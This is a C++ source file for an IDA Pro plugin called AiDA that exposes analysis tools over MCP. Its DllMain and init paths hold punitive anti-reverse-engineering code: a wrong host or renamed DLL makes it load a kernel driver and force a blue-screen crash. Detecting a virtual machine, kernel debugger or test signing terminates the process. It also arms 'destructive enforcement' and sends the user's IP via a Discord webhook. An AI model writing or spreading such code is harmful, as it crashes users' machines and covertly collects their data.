#include "aida_pro.hpp"

#include "anti_re.hpp"
#include "ida_utils.hpp"
#include "graphrag.hpp"
#include "analysis_db.hpp"

#ifdef __NT__
#include "driver_loader.hpp"
#include <atomic>
#include <thread>
#include <tlhelp32.h>
#endif

#ifdef __NT__
namespace {

constexpr DWORD kDllMainBadHostFastFailCode  = 0xA1DAB10Fu;
constexpr DWORD kDllMainBadNameFastFailCode  = 0xA1DAB110u;

bool ascii_iequal_w(const wchar_t* a, const wchar_t* b)
{
    while (*a && *b)
    {
        wchar_t la = static_cast<wchar_t>(towlower(*a));
        wchar_t lb = static_cast<wchar_t>(towlower(*b));
        if (la != lb)
            return false;
        ++a;
        ++b;
    }
    return *a == L'\0' && *b == L'\0';
}

bool plugin_get_basename(HMODULE module, wchar_t* out, size_t cap)
{
    wchar_t full_path[MAX_PATH] = {};
    DWORD got = GetModuleFileNameW(module, full_path, MAX_PATH);
    if (got == 0 || got >= MAX_PATH)
        return false;
    const wchar_t* base = full_path;
    for (const wchar_t* p = full_path; *p != L'\0'; ++p)
    {
        if (*p == L'\\' || *p == L'/')
            base = p + 1;
    }
    size_t len = wcslen(base);
    if (len + 1 > cap)
        return false;
    for (size_t i = 0; i < len; ++i)
        out[i] = base[i];
    out[len] = L'\0';
    return true;
}

bool plugin_host_is_ida_exe()
{
    wchar_t host_name[MAX_PATH] = {};
    if (!plugin_get_basename(nullptr, host_name, MAX_PATH))
        return false;
    static const wchar_t* allowed_hosts[] = {
        L"ida.exe",      L"ida64.exe",
        L"idat.exe",     L"idat64.exe",
        L"idaq.exe",     L"idaq64.exe",
        L"idaw.exe",     L"idaw64.exe",
        L"idal.exe",     L"idal64.exe",
        L"ida-pro.exe",  L"idapro.exe"
    };
    for (const wchar_t* allowed : allowed_hosts)
    {
        if (ascii_iequal_w(host_name, allowed))
            return true;
    }
    return false;
}

bool plugin_own_filename_is_canonical(HINSTANCE self_module)
{
    wchar_t own_name[MAX_PATH] = {};
    if (!plugin_get_basename(reinterpret_cast<HMODULE>(self_module), own_name, MAX_PATH))
        return false;
    return ascii_iequal_w(own_name, L"aida.dll");
}

DWORD WINAPI plugin_kill_thread(LPVOID param)
{
    DWORD reason = static_cast<DWORD>(reinterpret_cast<ULONG_PTR>(param));
    Sleep(50);
    bool driver_ok = false;
    __try {
        driver_ok = driver_loader::initialize_and_load();
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        driver_ok = false;
    }
    if (driver_ok)
    {
        __try {
            if (device && (device->is_connected() || device->connect()))
            {
                device->trigger_kernel_bsod(
                    reason,
                    static_cast<std::uint64_t>(__rdtsc()) ^ 0xA1DAB10C0FF1CEDDull);
                Sleep(3000);
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
        }
    }
    __fastfail(reason);
    return 0;
}

void plugin_dispatch_kill(DWORD reason)
{
    HANDLE t = CreateThread(
        nullptr, 0,
        plugin_kill_thread,
        reinterpret_cast<LPVOID>(static_cast<ULONG_PTR>(reason)),
        0, nullptr);
    if (t)
        CloseHandle(t);
}

void plugin_validate_load_context(HINSTANCE self_module)
{
    bool host_ok = plugin_host_is_ida_exe();
    bool name_ok = plugin_own_filename_is_canonical(self_module);
    if (host_ok && name_ok)
        return;
    DWORD reason = host_ok
        ? kDllMainBadNameFastFailCode
        : kDllMainBadHostFastFailCode;
    plugin_dispatch_kill(reason);
}

}
extern "C" BOOL WINAPI DllMain(HINSTANCE hinstDLL,
                                DWORD     fdwReason,
                                LPVOID    )
{
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hinstDLL);
        plugin_validate_load_context(hinstDLL);
    }
    return TRUE;
}

namespace {

constexpr int    kStandaloneWatchdogPeriodMs      = 5000;
constexpr int    kStandaloneWatchdogFailThreshold = 3;
constexpr int    kStandaloneWatchdogGraceTicks    = 6;
constexpr DWORD  kStandaloneAbsentFastFailCode    = 0xA1DA1DA1u;

std::atomic<bool> g_standalone_watchdog_started{false};
std::atomic<bool> g_standalone_watchdog_stop{false};

bool is_standalone_running()
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return true;
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32FirstW(snap, &pe))
    {
        do
        {
            if (_wcsicmp(pe.szExeFile, L"AiDAStandalone.exe") == 0)
            {
                found = true;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

bool plugin_cpuid_vm_vendor_match();
bool plugin_hyperv_guest_partition();
bool plugin_smbios_vm_string();
void plugin_vm_guard();
void plugin_kd_test_signing_guard();

void standalone_watchdog_thread()
{
    int consecutive_fail = 0;
    int grace_ticks = kStandaloneWatchdogGraceTicks;
    while (!g_standalone_watchdog_stop.load(std::memory_order_acquire))
    {
        Sleep(kStandaloneWatchdogPeriodMs);
        if (g_standalone_watchdog_stop.load(std::memory_order_acquire))
            break;

        plugin_vm_guard();
        plugin_kd_test_signing_guard();

        bool present = is_standalone_running();
        if (present)
        {
            consecutive_fail = 0;
            grace_ticks = 0;
            continue;
        }
        if (grace_ticks > 0)
        {
            --grace_ticks;
            continue;
        }
        ++consecutive_fail;
        if (consecutive_fail >= kStandaloneWatchdogFailThreshold)
        {
            __fastfail(kStandaloneAbsentFastFailCode);
        }
    }
}

void start_standalone_watchdog()
{
    bool expected = false;
    if (!g_standalone_watchdog_started.compare_exchange_strong(expected, true))
        return;
    std::thread(standalone_watchdog_thread).detach();
}

constexpr DWORD kVirtualMachineFastFailCode = 0xA1DAB10Cu;
constexpr DWORD kKernelDebugFastFailCode    = 0xA1DAB10Du;
constexpr DWORD kTestSigningFastFailCode    = 0xA1DAB10Eu;

bool plugin_cpuid_vm_vendor_match()
{
    int regs[4] = {};
    __cpuid(regs, 1);
    if ((regs[2] & (1 << 31)) == 0)
        return false;

    __cpuid(regs, 0x40000000);
    char vendor[12];
    memcpy(vendor + 0, &regs[1], 4);
    memcpy(vendor + 4, &regs[2], 4);
    memcpy(vendor + 8, &regs[3], 4);

    static const char* known[] = {
        "VMwareVMware",
        "KVMKVMKVM\0\0\0",
        "VBoxVBoxVBox",
        "XenVMMXenVMM",
        "prl hyperv \0",
        " lrpepyh vr",
        "bhyve bhyve ",
        "TCGTCGTCGTCG",
        "ACRNACRNACRN",
    };
    for (const auto* k : known)
    {
        if (memcmp(vendor, k, 12) == 0)
            return true;
    }
    return false;
}

bool plugin_hyperv_guest_partition()
{
    int regs[4] = {};
    __cpuid(regs, 1);
    if ((regs[2] & (1 << 31)) == 0)
        return false;

    __cpuid(regs, 0x40000000);
    char vendor[12];
    memcpy(vendor + 0, &regs[1], 4);
    memcpy(vendor + 4, &regs[2], 4);
    memcpy(vendor + 8, &regs[3], 4);

    const char hv[12] = { 'M','i','c','r','o','s','o','f','t',' ','H','v' };
    if (memcmp(vendor, hv, 12) != 0)
        return false;

    __cpuid(regs, 0x40000001);
    if (static_cast<uint32_t>(regs[0]) != 0x31237648u)
        return true;

    __cpuid(regs, 0x40000003);
    uint32_t partition_caps = static_cast<uint32_t>(regs[0]);
    const uint32_t root_bits = (1u << 0) | (1u << 1) | (1u << 5);
    return (partition_caps & root_bits) == 0;
}

bool plugin_smbios_vm_string()
{
    UINT size = GetSystemFirmwareTable('RSMB', 0, nullptr, 0);
    if (size == 0 || size > 1024 * 1024)
        return false;

    auto* buf = static_cast<uint8_t*>(malloc(size));
    if (!buf)
        return false;

    bool found = false;
    if (GetSystemFirmwareTable('RSMB', 0, buf, size) == size)
    {
        static const char* const short_needles[] = {
            "QEMU",
            "VBOX",
            "VirtualBox",
            "innotek",
            "BOCHS",
            "Bochs",
            "Parallels",
            "SeaBIOS",
            "BXPC",
            "OVMF",
            "EDK II",
            "Tianocore",
            "Standard PC (Q35"
        };
        for (UINT i = 0; i + 4 <= size && !found; ++i)
        {
            const char* p = reinterpret_cast<const char*>(buf + i);
            for (const char* needle : short_needles)
            {
                size_t nlen = strlen(needle);
                if (i + nlen > size)
                    continue;
                if (memcmp(p, needle, nlen) == 0)
                {
                    found = true;
                    break;
                }
            }
            if (found)
                break;
            if (i + 12 <= size &&
                (memcmp(p, "VMware, Inc.", 12) == 0
                 || memcmp(p, "VMware Virt", 11) == 0))
            {
                found = true;
            }
        }
    }
    free(buf);
    return found;
}

void plugin_vm_guard()
{
    if (plugin_cpuid_vm_vendor_match())
        __fastfail(kVirtualMachineFastFailCode);

    if (plugin_hyperv_guest_partition())
        __fastfail(kVirtualMachineFastFailCode);

    if (plugin_smbios_vm_string())
        __fastfail(kVirtualMachineFastFailCode);
}

using nt_query_system_information_t = LONG (WINAPI*)(ULONG, PVOID, ULONG, PULONG);

constexpr ULONG kPluginSystemKernelDebuggerInformation = 35;
constexpr ULONG kPluginSystemCodeIntegrityInformation  = 103;
constexpr ULONG kPluginCodeIntegrityTestSign           = 0x02;

struct plugin_system_kernel_debugger_information_t
{
    BOOLEAN kernel_debugger_enabled;
    BOOLEAN kernel_debugger_not_present;
};

struct plugin_system_code_integrity_information_t
{
    ULONG length;
    ULONG code_integrity_options;
};

nt_query_system_information_t plugin_resolve_nt_query_system_information()
{
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt)
        return nullptr;
    return reinterpret_cast<nt_query_system_information_t>(
        GetProcAddress(nt, "NtQuerySystemInformation"));
}

void plugin_kd_test_signing_guard()
{
    auto fn = plugin_resolve_nt_query_system_information();
    if (!fn)
        return;

    plugin_system_kernel_debugger_information_t kdi{};
    ULONG ret = 0;
    LONG status = fn(kPluginSystemKernelDebuggerInformation, &kdi, sizeof(kdi), &ret);
    if (status >= 0 && kdi.kernel_debugger_enabled != 0 && kdi.kernel_debugger_not_present == 0)
        __fastfail(kKernelDebugFastFailCode);

    plugin_system_code_integrity_information_t sci{};
    sci.length = sizeof(sci);
    ret = 0;
    status = fn(kPluginSystemCodeIntegrityInformation, &sci, sizeof(sci), &ret);
    if (status >= 0 && (sci.code_integrity_options & kPluginCodeIntegrityTestSign) != 0)
        __fastfail(kTestSigningFastFailCode);
}

}
#endif

#ifdef __NT__
static bool has_expected_plugin_filename()
{
    HMODULE module = nullptr;
    if (!GetModuleHandleExW(
            GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
                | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
            reinterpret_cast<LPCWSTR>(&has_expected_plugin_filename),
            &module) || module == nullptr)
    {
        return false;
    }

    wchar_t module_path[MAX_PATH] = {};
    if (GetModuleFileNameW(module, module_path, MAX_PATH) == 0)
        return false;

    const wchar_t* base_name = module_path;
    for (const wchar_t* p = module_path; *p != L'\0'; ++p)
    {
        if (*p == L'\\' || *p == L'/')
            base_name = p + 1;
    }

    return wcscmp(base_name, L"AiDA.dll") == 0;
}
#endif

extern "C" int __stdcall simpleline_place_t__compare2(
    const simpleline_place_t *a,
    const place_t *b,
    void *)
{
    return simpleline_place_t__compare(a, b);
}

extern "C" bool __stdcall simpleline_place_t__equals(
    const simpleline_place_t *a,
    const place_t *b,
    void *ud)
{
    return simpleline_place_t__compare2(a, b, ud) == 0;
}


static bool show_eula_dialog()
{
    int choice = ask_yn(ASKBTN_NO,
        "AiDA - End User License Agreement\n"
        "\n"
        "By clicking YES you acknowledge that you have read, understood,\n"
        "and agreed to the AiDA End User License Agreement.\n"
        "\n"
        "Key points:\n"
        "  - You may only use AiDA on targets you are legally authorized to analyze.\n"
        "  - The software contains anti-reverse-engineering self-defense mechanisms.\n"
        "  - Telemetry data (HWID, IP, Discord ID) is collected for license enforcement.\n"
        "  - AI provider endpoints are volatile and may change without notice.\n"
        "  - The kernel driver operates at Ring 0; system instability may occur.\n"
        "  - The software is provided AS-IS with no warranty.\n"
        "\n"
        "Do you accept the EULA?");
    return choice == ASKBTN_YES;
}


static int idaapi finish_populating_widget_popup(
    TWidget* widget, TPopupMenu* popup_handle,
    const action_activation_ctx_t* ctx)
{
    if (ctx == nullptr
        || (ctx->widget_type != BWN_PSEUDOCODE && ctx->widget_type != BWN_DISASM))
        return 0;

    static const char* const kept_actions[] = {
        "ai_assistant:copy_context",
        "ai_assistant:save_database_context",
        "ai_assistant:fix_analysis",
        "ai_assistant:toggle_mcp",
    };

    const std::string menu_root = OBFSTR("AiDA/");
    for (const char* action_name : kept_actions)
    {
        attach_action_to_popup(widget, popup_handle, action_name,
                               menu_root.c_str(), 0);
    }
    return 0;
}


ssize_t idaapi ui_event_listener_t::on_event(ssize_t code, va_list va)
{
#ifdef __NT__
    if (code == ui_ready_to_run)
        anti_re::initialize();
#endif

    if (code == ui_finish_populating_widget_popup)
    {
        TWidget* widget = va_arg(va, TWidget*);
        TPopupMenu* popup_handle = va_arg(va, TPopupMenu*);
        const action_activation_ctx_t* ctx = va_arg(va, const action_activation_ctx_t*);
        return finish_populating_widget_popup(widget, popup_handle, ctx);
    }
    return 0;
}

static int idaapi self_analysis_watchdog(void *)
{
    static bool s_self_target_checked = false;
    static bool s_is_self_target      = false;

    if (!s_self_target_checked)
    {
        s_is_self_target      = ida_utils::is_self_target_database();
        s_self_target_checked = true;
    }

    if (s_is_self_target)
        return -1;

#ifdef __NT__
    if (!anti_re::guard())
    {
        anti_re::latch_self_analysis_violation("self_analysis_watchdog");
        anti_re::sync_latched_violation_with_server();
        anti_re::arm_destructive_enforcement();
        anti_re::enforce_self_analysis_violation();
        return -1;
    }
#endif

    return 30000;
}

aida_plugin_t::aida_plugin_t()
{
    ida_utils::compute_self_identity();

    msg(OBFSTR_C("--- Plugin Loading (v%s) ---\n"), AIDA_VERSION);

#ifdef __NT__
    if (!driver_loader::is_driver_loaded())
        msg(OBFSTR_C("AiDA Driver: Warning - kernel driver trust state was lost after initialization.\n"));
    start_standalone_watchdog();
#endif

    g_settings.load(this);
    aida_db::AnalysisDB::instance().load();
    agent_tools::initialize_all_tools();
    analysis_fixer::install_hexrays_fixups();
    register_actions();
    hook_event_listener(HT_UI, &ui_listener);

    if (g_settings.mcp_enabled)
        start_mcp_server();

    msg(OBFSTR_C("--- Plugin Loaded Successfully ---\n"));


    std::string bin_hash = aida_db::AnalysisDB::instance().get_binary_hash();
    if (!bin_hash.empty())
    {
        std::thread([bin_hash]() {
            graphrag::load_graph(bin_hash);
        }).detach();
    }
}

aida_plugin_t::~aida_plugin_t()
{
#ifdef __NT__
    g_standalone_watchdog_stop.store(true, std::memory_order_release);
#endif

    std::string bin_hash = aida_db::AnalysisDB::instance().get_binary_hash();
    if (!bin_hash.empty())
        graphrag::save_graph(bin_hash);
    aida_db::AnalysisDB::instance().save();

    stop_mcp_server();
    ::unhook_event_listener(HT_UI, &ui_listener);
    analysis_fixer::uninstall_hexrays_fixups();
    unregister_actions();
    msg(OBFSTR_C("--- Plugin has been unloaded ---\n"));
}

bool idaapi aida_plugin_t::run(size_t)
{
    auto& license = license_manager_t::instance();
    if (!license.is_valid() || license.get_runtime_nonce() == 0)
    {
        warning(OBFSTR_C("License validation failed. Please restart IDA and enter a valid license key."));
        return false;
    }

    info(OBFSTR_C("Plugin is active. Use the right-click context menu in a code view or the Tools menu."));
    return true;
}

void aida_plugin_t::start_mcp_server()
{
    if (!g_settings.mcp_enabled)
        return;

    if (ida_utils::is_self_target_database())
    {
        msg(OBFSTR_C("MCP: disabled while AiDA itself is the active analysis target.\n"));
        return;
    }

    if (mcp_server && mcp_server->is_running())
        return;

    mcp_server = std::make_unique<mcp_server_t>();
    if (!mcp_server->start(g_settings.mcp_port))
    {
        msg(OBFSTR_C("MCP: Could not start server on port %d.\n"), g_settings.mcp_port);
        mcp_server.reset();
        return;
    }

    mcp_server->write_mcp_client_configs();
}

void aida_plugin_t::stop_mcp_server()
{
    if (mcp_server)
    {
        mcp_server->stop();
        mcp_server.reset();
    }
}

void aida_plugin_t::toggle_mcp_server()
{
    if (mcp_server && mcp_server->is_running())
    {
        stop_mcp_server();
        g_settings.mcp_enabled = false;
        g_settings.save();
        msg(OBFSTR_C("MCP: Server stopped and disabled.\n"));
    }
    else
    {
        g_settings.mcp_enabled = true;
        g_settings.save();
        start_mcp_server();
    }
}

void aida_plugin_t::register_actions()
{
    struct rt_action_def_t {
        std::string name;
        std::string label;
        action_handler::action_func_t handler;
        const char* shortcut;
    };

    const rt_action_def_t action_definitions[] = {
        {OBFSTR("ai_assistant:copy_context"), OBFSTR("Copy function contents"), handle_copy_context, "Ctrl+Alt+X"},
        {OBFSTR("ai_assistant:save_database_context"), OBFSTR("Save database context to file..."), handle_save_database_context, ""},
        {OBFSTR("ai_assistant:fix_analysis"), OBFSTR("Fix Analysis (Clean Decompilation)"), handle_fix_analysis, "Ctrl+Alt+F"},
        {OBFSTR("ai_assistant:toggle_mcp"), OBFSTR("Start MCP Server"), handle_toggle_mcp, ""},
    };

    const std::string menu_root = OBFSTR("AiDA/");

    for (const auto& def : action_definitions)
    {
        actions_list.push_back() = def.name.c_str();
        action_desc_t adesc = ACTION_DESC_LITERAL_PLUGMOD(
            def.name.c_str(),
            def.label.c_str(),
            new action_handler(def.handler, this),
            this,
            def.shortcut,
            nullptr,
            -1);
        adesc.flags |= ADF_OWN_HANDLER;

        if (!register_action(adesc))
        {
            msg(OBFSTR_C("Failed to register action %s\n"), def.name.c_str());
            continue;
        }
        attach_action_to_menu(menu_root.c_str(), def.name.c_str(), SETMENU_APP);
    }
}

void aida_plugin_t::unregister_actions()
{
    for (const auto& action_name : actions_list)
    {
        unregister_action(action_name.c_str());
    }
    actions_list.clear();
}

static plugmod_t* idaapi init()
{
#ifdef __NT__
    if (!has_expected_plugin_filename())
    {
        msg(OBFSTR_C("AiDA: plugin filename mismatch. Expected exact name: AiDA.dll\n"));
        return PLUGIN_SKIP;
    }

    plugin_vm_guard();
    plugin_kd_test_signing_guard();
#endif

    g_settings.load_from_file();

    if (!g_settings.eula_accepted)
    {
        if (!show_eula_dialog())
        {
            msg(OBFSTR_C("AiDA: End User License Agreement was declined. Plugin will not load.\n"));
            return PLUGIN_SKIP;
        }
        g_settings.eula_accepted = true;
        g_settings.save();
    }

#ifdef __NT__
    if (!driver_loader::initialize_and_load())
    {
        msg(OBFSTR_C("AiDA: kernel driver attestation is required and could not be initialized.\n"));
        return PLUGIN_SKIP;
    }

    if (!anti_re::initialize())
        msg(OBFSTR_C("AiDA: kernel-backed runtime attestation warm-up failed; runtime checks will retry on demand.\n"));
#endif


    ida_utils::compute_self_identity();
    if (ida_utils::is_self_target_database())
        return PLUGIN_SKIP;


    std::thread([]() { discord_webhook::get_public_ip(); }).detach();

    register_timer(10000, self_analysis_watchdog, nullptr);

    auto& license = license_manager_t::instance();

    bool license_ok = license.validate();

    if (!license_ok || !license.is_valid())
    {
        bool activated = false;
        for (int attempt = 0; attempt < 3; ++attempt)
        {
            if (license.show_activation_dialog())
            {
                activated = true;
                break;
            }

            if (attempt < 2)
            {
                int choice = ask_yn(ASKBTN_YES,
                    OBFSTR_C("License validation failed. Try again?"));
                if (choice != ASKBTN_YES)
                    break;
            }
        }

        if (!activated || !license.is_valid())
        {
            msg(OBFSTR_C("Plugin requires a valid license to operate.\n"));
            return PLUGIN_SKIP;
        }
    }

    license.start_revalidation_timer();

    license.snapshot_function_prologues();

#ifdef __NT__
    anti_re::start_pipe_monitor();
    {
        uint8_t self_sha[32] = {};
        if (ida_utils::get_self_sha256(self_sha))
            anti_re::start_process_hash_scanner(self_sha, 32);
    }
    anti_re::start_driver_tamper_monitor();
    anti_re::arm_destructive_enforcement();
#endif

    return new aida_plugin_t();
}

plugin_t PLUGIN =
{
  IDP_INTERFACE_VERSION,
  PLUGIN_MULTI,
  init,
  nullptr,
  nullptr,
  "AiDA MCP Server for IDA Pro",
  "Exposes IDA analysis tools via MCP protocol",
  "AiDA",
  ""
};
